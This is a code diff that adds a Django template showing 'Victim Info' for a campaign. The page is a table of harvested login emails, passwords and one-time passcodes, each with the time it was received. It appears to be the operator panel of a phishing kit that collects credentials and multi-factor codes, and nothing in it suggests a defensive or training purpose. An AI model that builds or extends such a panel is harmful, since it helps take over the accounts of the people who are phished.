@@ -1,0 +1,39 @@
+{% extends 'base.html' %}
+{% block title %}Victim Info for {{ campaign.name }}{% endblock %}
+{% block content %}
+<div class="container py-5">
+    <div class="mb-4">
+        <h2 class="fw-bold">Victim Info for Campaign: <span class="text-primary">{{ campaign.name }}</span></h2>
+        <p class="text-muted">Created: {{ campaign.created_at|date:"F d, Y H:i" }}</p>
+        <a href="{% url 'core:campaign_list' %}" class="btn btn-outline-secondary btn-sm">&larr; Back to Campaigns</a>
+    </div>
+    {% if victim_infos %}
+    <div class="table-responsive">
+        <table class="table table-bordered table-hover align-middle">
+            <thead class="table-light">
+                <tr>
+                    <th>ID</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>OTP</th>
+                    <th>Received</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for v in victim_infos %}
+                <tr>
+                    <td>{{ v.id }}</td>
+                    <td>{{ v.login_email|default:'—' }}</td>
+                    <td>{{ v.login_password|default:'—' }}</td>
+                    <td>{{ v.login_otp|default:'—' }}</td>
+                    <td>{{ v.created_at|date:"Y-m-d H:i" }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    {% else %}
+    <div class="alert alert-info text-center">No victim info has been received for this campaign yet.</div>
+    {% endif %}
+</div>
+{% endblock %}
